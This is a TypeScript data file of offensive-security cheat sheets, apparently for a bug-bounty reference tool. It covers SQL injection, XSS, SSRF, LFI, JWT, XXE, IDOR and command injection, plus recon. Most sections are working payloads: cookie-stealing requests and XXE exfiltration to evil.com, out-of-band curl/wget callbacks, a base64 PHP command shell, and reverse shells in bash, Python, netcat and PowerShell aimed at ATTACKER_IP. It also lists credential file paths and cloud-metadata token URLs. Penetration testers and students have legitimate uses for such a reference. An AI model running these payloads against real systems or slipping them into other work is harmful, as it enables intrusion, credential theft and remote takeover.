export type Difficulty = "Beginner" | "Intermediate" | "Advanced";

export interface CodeBlock {
  title?: string;
  code: string;
  language?: string;
}

export interface CheatSection {
  heading: string;
  description?: string;
  blocks: CodeBlock[];
  tips?: string[];
}

export interface CheatSheet {
  id: string;
  name: string;
  difficulty: Difficulty;
  description: string;
  sections: CheatSection[];
}

export const CHEAT_SHEETS: CheatSheet[] = [
  {
    id: "sqli",
    name: "SQL Injection",
    difficulty: "Intermediate",
    description: "Comprehensive SQL injection testing reference covering detection, exploitation, and bypass techniques across major database engines.",
    sections: [
      {
        heading: "Detection & Confirmation",
        description: "Initial probes to confirm SQL injection exists.",
        blocks: [
          { title: "String-based detection", code: "' OR '1'='1\n' OR '1'='2\n' AND '1'='1\n' AND '1'='2" },
          { title: "Numeric detection", code: "1 OR 1=1\n1 OR 1=2\n1 AND 1=1\n1 AND 1=2" },
          { title: "Comment-based", code: "' OR 1=1--\n' OR 1=1#\n' OR 1=1/*" },
        ],
        tips: ["Compare responses between true/false conditions", "Check for error messages, response length differences, or time delays"],
      },
      {
        heading: "UNION-Based Extraction",
        description: "Determine column count and extract data via UNION SELECT.",
        blocks: [
          { title: "Column enumeration", code: "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n-- Increment until error" },
          { title: "NULL-based UNION", code: "' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--" },
          { title: "Data extraction", code: "' UNION SELECT username,password FROM users--\n' UNION SELECT table_name,NULL FROM information_schema.tables--\n' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--" },
        ],
      },
      {
        heading: "Blind SQLi Techniques",
        blocks: [
          { title: "Boolean-based", code: "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--\n' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--\n' AND (SELECT COUNT(*) FROM users)>0--" },
          { title: "Time-based", code: "' AND SLEEP(5)--              # MySQL\n'; WAITFOR DELAY '0:0:5'--     # MSSQL\n'; SELECT pg_sleep(5)--        # PostgreSQL\n' AND IF(1=1,SLEEP(5),0)--    # Conditional" },
        ],
        tips: ["Use binary search for character extraction (>64, >96, >112...)", "Time-based is slower but works when no visible output differs"],
      },
      {
        heading: "Error-Based Extraction",
        blocks: [
          { title: "MySQL", code: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--\n' AND updatexml(1,CONCAT(0x7e,(SELECT user())),1)--\n' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" },
          { title: "MSSQL", code: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--\n' AND 1=CAST((SELECT @@version) AS int)--" },
        ],
      },
      {
        heading: "Database-Specific Syntax",
        blocks: [
          { title: "Version detection", code: "MySQL:       SELECT version()\nPostgreSQL:  SELECT version()\nMSSQL:       SELECT @@version\nOracle:      SELECT banner FROM v$version\nSQLite:      SELECT sqlite_version()" },
          { title: "String concatenation", code: "MySQL:       CONCAT('a','b')\nPostgreSQL:  'a' || 'b'\nMSSQL:       'a' + 'b'\nOracle:      'a' || 'b'\nSQLite:      'a' || 'b'" },
        ],
      },
      {
        heading: "WAF Bypass Techniques",
        blocks: [
          { title: "Encoding & obfuscation", code: "URL encode:   %27%20OR%201%3D1--\nDouble encode: %2527%20OR%201%253D1--\nHex:           0x27204f5220313d31\nCase mixing:   uNiOn SeLeCt\nComments:      UN/**/ION/**/ SE/**/LECT" },
          { title: "Alternative syntax", code: "UNION ALL SELECT instead of UNION SELECT\n/*!50000UNION*/ SELECT  (MySQL version comment)\nSELECT * FROM (SELECT 1)a JOIN (SELECT 2)b" },
        ],
      },
    ],
  },
  {
    id: "xss",
    name: "XSS",
    difficulty: "Intermediate",
    description: "Cross-Site Scripting attack vectors, context-specific payloads, and filter bypass techniques.",
    sections: [
      {
        heading: "Context-Specific Payloads",
        description: "Choose payload based on where your input is reflected.",
        blocks: [
          { title: "HTML body context", code: "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n<details open ontoggle=alert(1)>" },
          { title: "Attribute context", code: "\" onfocus=alert(1) autofocus=\"\n' onfocus=alert(1) autofocus='\n\" onmouseover=alert(1) \"" },
          { title: "JavaScript context", code: "'-alert(1)-'\n';alert(1)//\n\\';alert(1)//" },
          { title: "URL/href context", code: "javascript:alert(1)\ndata:text/html,<script>alert(1)</script>\njavascript:alert(document.domain)" },
        ],
      },
      {
        heading: "Filter Bypass Payloads",
        blocks: [
          { title: "Tag bypass", code: "<ScRiPt>alert(1)</ScRiPt>\n<scr<script>ipt>alert(1)</scr</script>ipt>\n<svg><animate onbegin=alert(1)>" },
          { title: "Keyword bypass", code: "';window['ale'+'rt'](1)//\n<img src=x onerror=eval(atob('YWxlcnQoMSk='))>\n<img src=x onerror=alert`1`>" },
          { title: "Encoding bypass", code: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\n%3Cscript%3Ealert(1)%3C/script%3E\n&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;" },
        ],
        tips: ["Test every input field, URL parameter, header, and cookie", "Check if the app uses DOMPurify, CSP, or other sanitization"],
      },
      {
        heading: "DOM-Based XSS Sources & Sinks",
        blocks: [
          { title: "Common sources", code: "document.URL\ndocument.documentURI\nlocation.href / location.hash / location.search\ndocument.referrer\nwindow.name\npostMessage data" },
          { title: "Common sinks", code: "element.innerHTML\ndocument.write()\neval()\nsetTimeout() / setInterval()\njQuery.html() / $.append()\nlocation.href = userInput" },
        ],
      },
      {
        heading: "Polyglot & Advanced",
        blocks: [
          { title: "Polyglot payload", code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</style></script>-->&lt;svg/onload=alert()>//" },
          { title: "Mutation XSS (mXSS)", code: "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>" },
          { title: "Cookie/data theft", code: "fetch('https://evil.com?c='+document.cookie)\nnew Image().src='https://evil.com?c='+document.cookie\nnavigator.sendBeacon('https://evil.com',document.cookie)" },
        ],
      },
    ],
  },
  {
    id: "ssrf",
    name: "SSRF Bypass",
    difficulty: "Advanced",
    description: "Server-Side Request Forgery bypass techniques for URL validation, IP denylist, and cloud metadata access.",
    sections: [
      {
        heading: "Cloud Metadata Endpoints",
        blocks: [
          { title: "AWS", code: "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data\nhttp://169.254.169.254/latest/dynamic/instance-identity/document" },
          { title: "GCP", code: "http://metadata.google.internal/computeMetadata/v1/\n  (Header: Metadata-Flavor: Google)\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id" },
          { title: "Azure", code: "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n  (Header: Metadata: true)\nhttp://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" },
        ],
      },
      {
        heading: "IP Address Bypass",
        blocks: [
          { title: "Localhost alternatives", code: "http://127.0.0.1\nhttp://localhost\nhttp://127.1\nhttp://0\nhttp://[::1]                    # IPv6\nhttp://0x7f000001               # Hex\nhttp://0177.0.0.1               # Octal\nhttp://2130706433               # Decimal\nhttp://017700000001             # Full octal\nhttp://127.0.0.1.nip.io         # DNS rebinding" },
          { title: "Internal network scanning", code: "http://10.0.0.1\nhttp://172.16.0.1\nhttp://192.168.1.1\nhttp://192.168.0.1:8080\nhttp://10.0.0.1:9200            # Elasticsearch\nhttp://10.0.0.1:6379            # Redis\nhttp://10.0.0.1:27017           # MongoDB" },
        ],
      },
      {
        heading: "Protocol Bypass",
        blocks: [
          { code: "file:///etc/passwd\ngopher://127.0.0.1:25/xHELO%20localhost\ndict://127.0.0.1:11211/stat\nftp://127.0.0.1/\njar:http://evil.com/evil.jar!/file.txt" },
        ],
        tips: ["Try switching between http/https", "Use URL encoding, double encoding, or unicode normalization"],
      },
      {
        heading: "URL Parser Confusion",
        blocks: [
          { code: "http://evil.com@127.0.0.1       # Userinfo section\nhttp://127.0.0.1#@evil.com      # Fragment confusion\nhttp://127.0.0.1%00@evil.com    # Null byte\nhttp://127.0.0.1%23@evil.com    # Encoded hash\nhttp://evil.com\\@127.0.0.1      # Backslash confusion" },
        ],
      },
    ],
  },
  {
    id: "lfi",
    name: "LFI Techniques",
    difficulty: "Intermediate",
    description: "Local File Inclusion exploitation techniques, interesting file paths, and PHP wrapper abuse.",
    sections: [
      {
        heading: "Linux Interesting Files",
        blocks: [
          { code: "/etc/passwd\n/etc/shadow\n/etc/hosts\n/etc/hostname\n/etc/crontab\n/proc/self/environ\n/proc/self/cmdline\n/proc/self/fd/0\n/proc/version\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/auth.log\n/home/user/.bash_history\n/home/user/.ssh/id_rsa\n/root/.bash_history" },
        ],
      },
      {
        heading: "Windows Interesting Files",
        blocks: [
          { code: "C:\\Windows\\system.ini\nC:\\Windows\\win.ini\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\inetpub\\logs\\LogFiles\\\nC:\\inetpub\\wwwroot\\web.config\nC:\\Users\\Administrator\\.ssh\\id_rsa\nC:\\Windows\\debug\\NetSetup.log\nC:\\Windows\\System32\\config\\SAM" },
        ],
      },
      {
        heading: "Traversal Encoding Bypass",
        blocks: [
          { title: "Encoding variants", code: "../../../etc/passwd               # Basic\n..%2f..%2f..%2fetc/passwd         # URL encoded\n..%252f..%252f..%252fetc/passwd   # Double encoded\n..%c0%af..%c0%af..%c0%afetc/passwd # UTF-8 overlong\n....//....//....//etc/passwd      # Nested bypass\n..;/..;/..;/etc/passwd            # Tomcat semicolon\n%2e%2e%2f%2e%2e%2fetc/passwd      # Full encoding" },
        ],
      },
      {
        heading: "PHP Wrapper Exploitation",
        blocks: [
          { title: "Read source code", code: "php://filter/convert.base64-encode/resource=index.php\nphp://filter/read=string.rot13/resource=config.php\nphp://filter/convert.iconv.utf-8.utf-16/resource=index.php" },
          { title: "Remote code execution", code: "php://input                       # POST body as PHP\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=\nexpect://whoami\nphar://uploads/avatar.jpg/shell.php\nzip://uploads/evil.zip%23shell.php" },
        ],
        tips: ["Log poisoning: inject PHP into access logs, then include the log file", "Use php://filter to read source before attempting RCE"],
      },
    ],
  },
  {
    id: "jwt",
    name: "JWT Attacks",
    difficulty: "Advanced",
    description: "JSON Web Token attack techniques including algorithm confusion, claim tampering, and key attacks.",
    sections: [
      {
        heading: "JWT Structure",
        description: "Header.Payload.Signature — each base64url encoded.",
        blocks: [
          { title: "Decode a JWT", code: "echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d\n# Or use jwt.io / jwt_tool\npython3 -m jwt decode TOKEN" },
          { title: "Standard claims", code: "iss - Issuer\nsub - Subject (user ID)\naud - Audience\nexp - Expiration time\niat - Issued at\nnbf - Not before\njti - JWT ID (unique identifier)" },
        ],
      },
      {
        heading: "Algorithm Attacks",
        blocks: [
          { title: "None algorithm", code: 'Header: {"alg":"none","typ":"JWT"}\nPayload: {"sub":"admin"}\nSignature: (empty)\n\nVariations: None, NONE, nOnE, NonE' },
          { title: "RS256 → HS256 confusion", code: "1. Get the server's RSA public key\n2. Change header: {\"alg\":\"HS256\"}\n3. Sign the token using the public key as HMAC secret\n4. Server verifies HMAC with its public key ✓" },
          { title: "Weak secret brute-force", code: "hashcat -m 16500 jwt.txt wordlist.txt\npython3 jwt_tool.py TOKEN -C -d wordlist.txt\njohn jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256" },
        ],
      },
      {
        heading: "Key Injection Attacks",
        blocks: [
          { title: "KID manipulation", code: '{"kid":"../../dev/null"}         + empty secret\n{"kid":"key1\' UNION SELECT \'s\' --"}\n{"kid":"../../proc/self/environ"} + env value as key' },
          { title: "JKU / X5U injection", code: '{"jku":"https://evil.com/.well-known/jwks.json"}\n{"x5u":"https://evil.com/cert.pem"}\n\nHost your own JWKS endpoint with your key pair' },
        ],
      },
      {
        heading: "Claim Tampering",
        blocks: [
          { code: 'Change "sub":"user" → "sub":"admin"\nAdd "role":"admin" or "is_admin":true\nChange "exp":past → "exp":9999999999\nModify "iss" to bypass issuer validation\nAdd custom claims the app may trust' },
        ],
        tips: ["Always check if the token is actually validated server-side", "Test with expired tokens, modified signatures, and tampered claims separately"],
      },
    ],
  },
  {
    id: "xxe",
    name: "XXE Payloads",
    difficulty: "Advanced",
    description: "XML External Entity injection payloads for file reading, SSRF, and out-of-band data exfiltration.",
    sections: [
      {
        heading: "Basic XXE",
        blocks: [
          { title: "File read", code: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>' },
          { title: "SSRF via XXE", code: '<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n]>\n<foo>&xxe;</foo>' },
        ],
      },
      {
        heading: "Out-of-Band (OOB) Exfiltration",
        blocks: [
          { title: "External DTD method", code: '<!-- Attacker DTD (hosted at http://evil.com/xxe.dtd) -->\n<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?d=%file;\'>">\n%eval;\n%exfil;\n\n<!-- Payload -->\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">\n  %xxe;\n]>\n<foo>test</foo>' },
        ],
        tips: ["OOB is needed when the XML response isn't reflected back", "Use Burp Collaborator or interact.sh to capture callbacks"],
      },
      {
        heading: "XXE in Different Formats",
        blocks: [
          { title: "SVG upload", code: '<svg xmlns="http://www.w3.org/2000/svg">\n  <!DOCTYPE svg [\n    <!ENTITY xxe SYSTEM "file:///etc/passwd">\n  ]>\n  <text>&xxe;</text>\n</svg>' },
          { title: "Content-Type switch", code: "Change Content-Type: application/json\nTo:     Content-Type: application/xml\n\nThen send XML body with XXE payload" },
          { title: "DOCX/XLSX/SVG files", code: "1. Unzip the file (they're ZIP archives)\n2. Edit XML files inside (e.g., [Content_Types].xml)\n3. Inject XXE entity\n4. Re-zip and upload" },
        ],
      },
      {
        heading: "Denial of Service",
        blocks: [
          { title: "Billion laughs", code: '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol "lol">\n  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n]>\n<root>&lol4;</root>' },
        ],
      },
    ],
  },
  {
    id: "idor",
    name: "IDOR Patterns",
    difficulty: "Beginner",
    description: "Common Insecure Direct Object Reference patterns and testing methodology.",
    sections: [
      {
        heading: "Testing Methodology",
        description: "Step-by-step approach to finding IDORs.",
        blocks: [
          { title: "Steps", code: "1. Create two test accounts (user A and user B)\n2. Perform actions as user A, capture all requests\n3. Identify object references (IDs, UUIDs, filenames)\n4. Replay requests as user B with user A's references\n5. Check: Can user B access/modify user A's objects?" },
        ],
        tips: ["Test every API endpoint that references a user-specific resource", "Don't just test GET — test PUT, PATCH, DELETE too"],
      },
      {
        heading: "Common IDOR Locations",
        blocks: [
          { title: "URL path parameters", code: "GET /api/users/123/profile\nGET /api/orders/456\nGET /api/documents/789/download\nGET /api/invoices/INV-001" },
          { title: "Query parameters", code: "GET /api/data?user_id=123\nGET /api/report?account=456\nGET /api/file?name=user123_doc.pdf" },
          { title: "Request body", code: 'POST /api/transfer\n{"from_account":"123","to_account":"456","amount":100}\n\nPOST /api/password-reset\n{"user_id":"victim_id"}' },
          { title: "Headers", code: "X-User-Id: 123\nX-Account-Id: 456\nAuthorization: Bearer <other_user_token>" },
        ],
      },
      {
        heading: "ID Types to Test",
        blocks: [
          { code: "Sequential integers:  1, 2, 3, 4...\nUUIDs:               Try guessing or leaking from other endpoints\nEncoded IDs:         Base64 decode, modify, re-encode\nHashed IDs:          Check if MD5/SHA1 of predictable values\nTimestamp-based:     Predict based on creation time\nUsername-based:      /api/users/john → /api/users/admin" },
        ],
      },
    ],
  },
  {
    id: "cmdi",
    name: "Command Injection",
    difficulty: "Advanced",
    description: "OS command injection techniques for bash and PowerShell with blind detection methods.",
    sections: [
      {
        heading: "Injection Operators",
        blocks: [
          { title: "Linux/Bash", code: "; whoami                 # Semicolon (sequential)\n| whoami                 # Pipe (chain output)\n|| whoami                # OR (runs if first fails)\n&& whoami                # AND (runs if first succeeds)\n$(whoami)                # Command substitution\n`whoami`                 # Backtick substitution\n%0awhoami                # Newline injection\n\\nwhoami                 # Escaped newline" },
          { title: "Windows/CMD", code: "& whoami                 # Sequential\n&& whoami                # AND\n|| whoami                # OR\n| whoami                 # Pipe\n%0a whoami               # Newline" },
          { title: "PowerShell", code: "; Invoke-Expression 'whoami'\n| powershell -c whoami\n; powershell -enc <base64cmd>" },
        ],
      },
      {
        heading: "Blind Detection",
        blocks: [
          { title: "Time-based", code: "; sleep 5\n; ping -c 5 127.0.0.1\n& timeout /t 5\n| powershell Start-Sleep -s 5" },
          { title: "Out-of-band", code: "; curl http://collaborator.evil.com\n; wget http://collaborator.evil.com\n; nslookup collaborator.evil.com\n; nslookup $(whoami).collaborator.evil.com" },
          { title: "File-based", code: "; whoami > /tmp/output.txt\n; ls -la /tmp/output.txt\n# Then include/read the output file" },
        ],
      },
      {
        heading: "Filter Bypass",
        blocks: [
          { code: "# Space bypass\n{cat,/etc/passwd}        # Brace expansion\ncat${IFS}/etc/passwd     # IFS variable\ncat$IFS$9/etc/passwd     # IFS with positional\ncat</etc/passwd          # Input redirection\n\n# Keyword bypass\nwh$()oami                # Empty substitution\nw'h'o'a'm'i             # Quote insertion\nw\\ho\\am\\i               # Backslash insertion\n/bin/w?oami              # Wildcard" },
        ],
        tips: ["Always test both Linux and Windows payloads", "Check for WAF bypass with encoding and alternative syntax"],
      },
      {
        heading: "Reverse Shells",
        blocks: [
          { code: "# Bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Python\npython3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"IP\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n\n# Netcat\nnc -e /bin/sh ATTACKER_IP 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f\n\n# PowerShell\npowershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}\"" },
        ],
      },
    ],
  },
  {
    id: "recon",
    name: "Recon Checklist",
    difficulty: "Beginner",
    description: "Systematic reconnaissance checklist for bug bounty hunting and penetration testing.",
    sections: [
      {
        heading: "Subdomain Enumeration",
        blocks: [
          { title: "Passive enumeration", code: "# Certificate Transparency\ncurl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u\n\n# Subfinder\nsubfinder -d target.com -silent\n\n# Amass passive\namass enum -passive -d target.com\n\n# Online sources\n# - SecurityTrails, VirusTotal, Shodan, Censys" },
          { title: "Active enumeration", code: "# DNS brute force\ngobuster dns -d target.com -w wordlist.txt\n\n# Permutation scanning\naltdns -i subdomains.txt -o permuted.txt -w words.txt\n\n# Virtual host discovery\nffuf -u http://target.com -H 'Host: FUZZ.target.com' -w wordlist.txt" },
        ],
      },
      {
        heading: "Technology Fingerprinting",
        blocks: [
          { code: "# Wappalyzer / BuiltWith (browser extensions)\n\n# WhatWeb\nwhatweb target.com\n\n# HTTP headers analysis\ncurl -I https://target.com\n\n# Check for common files\n/robots.txt, /sitemap.xml, /.well-known/\n/package.json, /composer.json\n/.git/config, /.env, /wp-login.php" },
        ],
      },
      {
        heading: "Content Discovery",
        blocks: [
          { code: "# Directory brute force\nffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt\ngobuster dir -u https://target.com -w wordlist.txt\n\n# API endpoint discovery\nffuf -u https://target.com/api/FUZZ -w api-wordlist.txt\n\n# Parameter discovery\narjun -u https://target.com/page\nparamspider -d target.com\n\n# JavaScript file analysis\n# Extract endpoints from JS files\ncat file.js | grep -oP '\"(/[a-zA-Z0-9_/\\-]+)\"'" },
        ],
        tips: ["Always check Wayback Machine for historical endpoints", "Use multiple wordlists and tools for comprehensive coverage"],
      },
      {
        heading: "Port Scanning",
        blocks: [
          { code: "# Quick scan\nnmap -sV -sC target.com\n\n# Full port scan\nnmap -p- -T4 target.com\n\n# Service version detection\nnmap -sV -p 80,443,8080,8443 target.com\n\n# Masscan (fast)\nmasscan -p1-65535 target.com --rate=1000" },
        ],
      },
    ],
  },
  {
    id: "workflow",
    name: "Bug Bounty Workflow",
    difficulty: "Beginner",
    description: "End-to-end bug bounty hunting workflow from target selection to report submission.",
    sections: [
      {
        heading: "Phase 1: Target Selection",
        blocks: [
          { code: "1. Read the program scope carefully\n2. Identify in-scope domains, IPs, and applications\n3. Note out-of-scope items and restrictions\n4. Check for safe harbor / legal protections\n5. Review past disclosed reports for patterns" },
        ],
      },
      {
        heading: "Phase 2: Reconnaissance",
        blocks: [
          { code: "1. Subdomain enumeration (passive + active)\n2. Port scanning and service detection\n3. Technology fingerprinting\n4. Content/directory discovery\n5. JavaScript analysis for endpoints\n6. Parameter discovery\n7. Map the attack surface" },
        ],
      },
      {
        heading: "Phase 3: Vulnerability Testing",
        blocks: [
          { title: "Priority order", code: "1. Authentication & Session Management\n   - Login bypass, password reset flaws, session fixation\n\n2. Authorization (IDOR/Access Control)\n   - Horizontal & vertical privilege escalation\n\n3. Injection Attacks\n   - SQLi, XSS, SSRF, command injection\n\n4. Business Logic Flaws\n   - Race conditions, price manipulation, workflow bypass\n\n5. Information Disclosure\n   - Debug endpoints, verbose errors, exposed credentials" },
        ],
      },
      {
        heading: "Phase 4: Reporting",
        blocks: [
          { title: "Report template", code: "## Title\nClear, descriptive vulnerability title\n\n## Severity\nCritical / High / Medium / Low (use CVSS if required)\n\n## Description\nWhat the vulnerability is and why it matters\n\n## Steps to Reproduce\n1. Go to https://...\n2. Enter payload: ...\n3. Observe: ...\n\n## Impact\nWhat an attacker can achieve\n\n## Proof of Concept\nScreenshots, video, or HTTP requests\n\n## Remediation\nSuggested fix" },
        ],
        tips: ["Always provide clear reproduction steps", "Include impact assessment — what's the worst case?", "Be professional and respectful in all communications"],
      },
    ],
  },
  {
    id: "http-methods",
    name: "HTTP Methods",
    difficulty: "Beginner",
    description: "HTTP method reference with security testing implications and method override techniques.",
    sections: [
      {
        heading: "Standard Methods",
        blocks: [
          { code: "GET      - Retrieve a resource (safe, idempotent)\nPOST     - Create a resource / submit data\nPUT      - Replace a resource entirely (idempotent)\nPATCH    - Partially update a resource\nDELETE   - Remove a resource (idempotent)\nHEAD     - GET without response body\nOPTIONS  - List allowed methods (CORS preflight)\nTRACE    - Echo request back (debug, often disabled)\nCONNECT  - Establish tunnel (proxies)" },
        ],
      },
      {
        heading: "Security Testing with Methods",
        blocks: [
          { title: "Method enumeration", code: "# Test all methods on endpoint\nfor method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do\n  curl -X $method -s -o /dev/null -w \"%{http_code}\" https://target.com/api/resource\n  echo \" $method\"\ndone" },
          { title: "Method override bypass", code: "# Header overrides\nX-HTTP-Method-Override: PUT\nX-HTTP-Method: DELETE\nX-Method-Override: PATCH\n\n# Query parameter\n?_method=PUT\n?method=DELETE\n\n# Use case: bypass method-based access controls\nGET /admin → 403\nPOST /admin with X-HTTP-Method-Override: GET → 200" },
        ],
        tips: ["Test if changing GET to POST (or vice versa) bypasses auth", "Check if DELETE works on resources you shouldn't be able to delete"],
      },
      {
        heading: "CORS & OPTIONS",
        blocks: [
          { code: "# CORS preflight request\nOPTIONS /api/data HTTP/1.1\nHost: target.com\nOrigin: https://evil.com\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: Content-Type\n\n# Check response headers:\nAccess-Control-Allow-Origin: *           # Dangerous!\nAccess-Control-Allow-Origin: null        # Exploitable\nAccess-Control-Allow-Credentials: true   # With *, very bad" },
        ],
      },
    ],
  },
  {
    id: "status-codes",
    name: "Status Codes",
    difficulty: "Beginner",
    description: "HTTP status code reference with security implications and common misconfigurations.",
    sections: [
      {
        heading: "1xx Informational",
        blocks: [
          { code: "100 Continue           - Client should continue request\n101 Switching Protocols - Upgrading to WebSocket\n103 Early Hints        - Preload resources" },
        ],
      },
      {
        heading: "2xx Success",
        blocks: [
          { code: "200 OK                 - Request succeeded\n201 Created            - Resource created (POST/PUT)\n202 Accepted           - Request accepted, processing async\n204 No Content         - Success with no body (DELETE)\n206 Partial Content    - Range request fulfilled" },
        ],
      },
      {
        heading: "3xx Redirection",
        blocks: [
          { code: "301 Moved Permanently  - Permanent redirect (cached)\n302 Found              - Temporary redirect\n303 See Other          - Redirect after POST (use GET)\n304 Not Modified       - Cached version is current\n307 Temporary Redirect - Like 302 but preserves method\n308 Permanent Redirect - Like 301 but preserves method" },
        ],
        tips: ["Open redirect: check if Location header uses user input", "302 vs 307: method change can lead to security issues"],
      },
      {
        heading: "4xx Client Errors",
        blocks: [
          { code: "400 Bad Request        - Malformed request\n401 Unauthorized       - Authentication required\n403 Forbidden          - Authenticated but not authorized\n404 Not Found          - Resource doesn't exist\n405 Method Not Allowed - HTTP method not supported\n409 Conflict           - Request conflicts with state\n413 Payload Too Large  - Request body too big\n414 URI Too Long       - URL exceeds server limit\n415 Unsupported Media  - Content-Type not accepted\n429 Too Many Requests  - Rate limited\n431 Headers Too Large  - Request headers too big" },
        ],
        tips: ["403 vs 401: 403 means the server knows who you are but denies access", "403 might be bypassable with method override or path manipulation", "429 indicates rate limiting — check if it can be bypassed"],
      },
      {
        heading: "5xx Server Errors",
        blocks: [
          { code: "500 Internal Server Error - Unhandled exception (look for stack traces!)\n501 Not Implemented       - Server doesn't support the method\n502 Bad Gateway           - Upstream server error\n503 Service Unavailable   - Server overloaded / maintenance\n504 Gateway Timeout       - Upstream server timeout" },
        ],
        tips: ["500 errors often leak stack traces, file paths, or technology info", "Trigger 500s with malformed input to fingerprint the backend"],
      },
    ],
  },
];
